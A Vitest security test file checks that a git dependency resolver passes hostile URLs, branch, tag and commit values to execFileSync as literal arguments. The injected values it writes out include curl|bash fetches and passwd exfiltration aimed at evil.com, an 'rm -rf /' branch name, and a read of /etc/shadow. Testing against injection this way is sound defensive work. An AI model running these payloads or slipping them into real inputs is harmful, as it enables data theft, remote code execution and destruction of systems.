import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { GitResolver } from '../../src/services/git-resolver';
import { createTempDir, cleanupTempDir, writeJsonFile } from '../helpers/test-utils';
import path from 'path';
import fs from 'fs-extra';
import { execFileSync } from 'child_process';

// Mock execFileSync to capture calls
vi.mock('child_process', () => ({
  execFileSync: vi.fn()
}));

/**
 * Shell injection security tests.
 *
 * These tests verify that malicious input in git URLs, branch names, tag names,
 * and commit hashes cannot execute arbitrary shell commands.
 */
describe('Shell Injection Prevention', () => {
  let gitResolver: GitResolver;
  let tempDir: string;

  beforeEach(async () => {
    gitResolver = new GitResolver();
    tempDir = await createTempDir('injection-test-');
    vi.clearAllMocks();
  });

  afterEach(async () => {
    await cleanupTempDir(tempDir);
  });

  it('should pass malicious URL as a literal argument, not through a shell', async () => {
    // This URL contains a shell injection payload: after the semicolon,
    // it attempts to curl a malicious script and pipe it to bash.
    // With the old execSync() approach, this would execute:
    //   git clone --depth 1 https://evil.com/repo.git; curl https://evil.com/steal.sh | bash /tmp/dir
    // The shell would run git clone AND THEN the curl|bash pipeline.
    const maliciousUrl = 'https://evil.com/repo.git; curl https://evil.com/steal.sh | bash';

    const mockExecFileSync = vi.mocked(execFileSync);
    mockExecFileSync.mockImplementation(() => {
      // Simulate git failure (the malicious URL is not a valid git repo)
      throw new Error('fatal: repository not found');
    });

    await expect(
      gitResolver.resolveGitDependency({
        url: maliciousUrl,
        branch: 'main'
      })
    ).rejects.toThrow();

    // Verify execFileSync was called with the URL as a single array element,
    // NOT interpolated into a shell command string.
    const cloneCall = mockExecFileSync.mock.calls[0];
    expect(cloneCall[0]).toBe('git');

    const args = cloneCall[1] as string[];
    expect(args[0]).toBe('clone');

    // The malicious URL must be passed as ONE argument — the entire string
    // including the "; curl ..." part is treated as a literal URL, not
    // parsed by a shell. Git will simply fail to clone it.
    expect(args).toContain(maliciousUrl);

    // Crucially: execFileSync was called with 'git' as the executable and
    // an args array. There is no shell to interpret the semicolon, pipe,
    // or any other metacharacter in the URL.
    expect(cloneCall[0]).not.toContain(maliciousUrl); // URL is not in the command string
  });

  it('should not interpret shell metacharacters in branch names', async () => {
    const maliciousBranch = 'main; rm -rf /';

    const mockExecFileSync = vi.mocked(execFileSync);
    mockExecFileSync.mockImplementation(() => {
      throw new Error('fatal: remote branch not found');
    });

    await expect(
      gitResolver.resolveGitDependency({
        url: 'https://github.com/test/repo.git',
        branch: maliciousBranch
      })
    ).rejects.toThrow();

    // The branch name with shell metacharacters is passed as a single arg
    const cloneCall = mockExecFileSync.mock.calls[0];
    const args = cloneCall[1] as string[];

    // -b and the branch name should be separate array elements
    const branchFlagIndex = args.indexOf('-b');
    expect(branchFlagIndex).toBeGreaterThan(-1);
    expect(args[branchFlagIndex + 1]).toBe(maliciousBranch);
  });

  it('should not interpret shell metacharacters in tag names', async () => {
    const maliciousTag = 'v1.0.0$(curl evil.com/exfiltrate?data=$(cat /etc/passwd))';

    const mockExecFileSync = vi.mocked(execFileSync);
    mockExecFileSync.mockImplementation(() => {
      throw new Error('fatal: remote tag not found');
    });

    await expect(
      gitResolver.resolveGitDependency({
        url: 'https://github.com/test/repo.git',
        tag: maliciousTag
      })
    ).rejects.toThrow();

    const cloneCall = mockExecFileSync.mock.calls[0];
    const args = cloneCall[1] as string[];

    // The $() command substitution is passed as a literal string, not evaluated
    const branchFlagIndex = args.indexOf('-b');
    expect(branchFlagIndex).toBeGreaterThan(-1);
    expect(args[branchFlagIndex + 1]).toBe(maliciousTag);
  });

  it('should not interpret shell metacharacters in commit hashes', async () => {
    // A malicious commit hash that tries to inject commands via backticks
    const maliciousCommit = 'abc123`curl evil.com/pwned`';

    const mockRepoPath = path.join(tempDir, 'mock-repo');
    await fs.ensureDir(mockRepoPath);
    await writeJsonFile(path.join(mockRepoPath, 'craftdesk.json'), {
      name: 'test-skill',
      version: '1.0.0',
      type: 'skill',
      dependencies: {}
    });

    const mockExecFileSync = vi.mocked(execFileSync);
    let checkoutArgs: string[] | undefined;

    mockExecFileSync.mockImplementation((_cmd: any, args?: any, options?: any) => {
      const argsArr = args as string[];
      if (argsArr[0] === 'clone') {
        const targetDir = argsArr[argsArr.length - 1];
        fs.copySync(mockRepoPath, targetDir);
        return Buffer.from('');
      } else if (argsArr[0] === 'fetch') {
        return Buffer.from('');
      } else if (argsArr[0] === 'checkout') {
        // Capture the checkout args to verify the malicious commit is literal
        checkoutArgs = argsArr;
        return Buffer.from('');
      } else if (argsArr[0] === 'rev-parse') {
        const output = 'abc123def456789012345678901234567890abcd\n';
        return options?.encoding === 'utf8' ? output : Buffer.from(output);
      }
      return Buffer.from('');
    });

    await gitResolver.resolveGitDependency({
      url: 'https://github.com/test/repo.git',
      branch: 'main',
      commit: maliciousCommit
    });

    // The backtick-injected command is passed as a literal checkout target
    expect(checkoutArgs).toBeDefined();
    expect(checkoutArgs![0]).toBe('checkout');
    expect(checkoutArgs![1]).toBe(maliciousCommit);
  });

  it('should not interpret shell pipes in URLs used for ls-remote', async () => {
    // This tests the update.ts / outdated.ts pattern where git ls-remote
    // is called with a URL that could contain shell pipes.
    // We import the exported wrappers for testing.
    const { getRemoteTagsExported, getRemoteHeadCommitExported } =
      await import('../../src/commands/outdated');

    const maliciousUrl = 'https://evil.com/repo.git | cat /etc/shadow > /tmp/pwned';

    const mockExecFileSync = vi.mocked(execFileSync);
    mockExecFileSync.mockImplementation(() => {
      throw new Error('fatal: not a git repository');
    });

    // These should safely fail without executing the pipe
    const tags = getRemoteTagsExported(maliciousUrl);
    expect(tags).toEqual([]);

    const commit = getRemoteHeadCommitExported(maliciousUrl, 'main');
    expect(commit).toBeNull();

    // Verify the URL was passed as a single array element
    for (const call of mockExecFileSync.mock.calls) {
      const args = call[1] as string[];
      expect(args).toContain(maliciousUrl);
    }
  });
});
